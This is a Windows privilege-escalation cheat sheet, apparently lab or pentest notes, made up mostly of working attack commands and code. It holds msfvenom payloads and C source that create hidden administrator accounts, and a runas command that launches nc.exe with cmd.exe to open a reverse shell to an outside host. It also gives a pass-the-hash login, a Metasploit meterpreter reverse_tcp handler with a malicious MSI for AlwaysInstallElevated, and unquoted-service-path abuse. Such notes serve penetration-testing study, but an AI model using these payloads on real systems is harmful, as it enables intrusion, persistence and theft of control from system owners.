
# Generate Malicious Executables
### MsfVenom
#### Adduser
\*Note: On x64 machine you should use bat2exe.bat to create 64 bit executable\*
```
1\. Open command prompt and type: msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o exploit.exe
2\. Copy the generated file, exploit.exe, to the Windows VM.
```
### C Script 
Write and compile malicious exe file to add a user to the system as an admin
#### Adduser
##### Contents of adduser.c
```
#include &lt;stdlib.h&gt;

int main ()
{

	int i;

	i = system ("net user evil Ev!lpass /add");
	i = system ("net localgroup administrators evil /add");

		return 0;
}
```

##### Compile adduser.c on kali
```
sudo i686-w64-mingw32-gcc adduser.c -o exploit.exe
```

#  Exploit Sensitive data
## Passwords reuse
### cmdkey
```
runas /savecred /user:ACCESS\\Administrator "c:\\windows\\system32\\cmd.exe /c \\\IP\\share\\nc.exe -nv 10.10.14.2 80 -e cmd.exe"  
```
## Passwords in Registry
### Pass the Hash
Use the NTLM hash to authenticate 
```
pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2 eb3b9f05c425e //10.11.0.22 cmd
```
# Exploit Misconfigurations

## Privileges 

### AlwaysInstallElevated

#### Kali VM
```
1\. Open command prompt and type: msfconsole
2\. In Metasploit (msf > prompt) type: use multi/handler
3\. In Metasploit (msf > prompt) type: set payload windows/meterpreter/reverse_tcp
4\. In Metasploit (msf > prompt) type: set lhost \[Kali VM IP Address\]
5\. In Metasploit (msf > prompt) type: run
6\. Open an additional command prompt and type: msfvenom -p windows/meterpreter/reverse_tcp lhost=\[Kali VM IP Address\] -f msi -o setup.msi
7\. Copy the generated file, setup.msi, to the Windows VM.
```
#### Windows VM
```
1.Place ‘setup.msi’ in ‘C:\\Temp’.
2.Open command prompt and type: msiexec /quiet /qn /i C:\\Temp\\setup.msi
```
## Services 
### Service Path modification
### Unquoted Service Path 
```
1\. Place Unquoted.exe in ‘C:\\Program Files\\Unquoted Path Service’.
2\. Open command prompt and type: sc start unquotedsvc
```

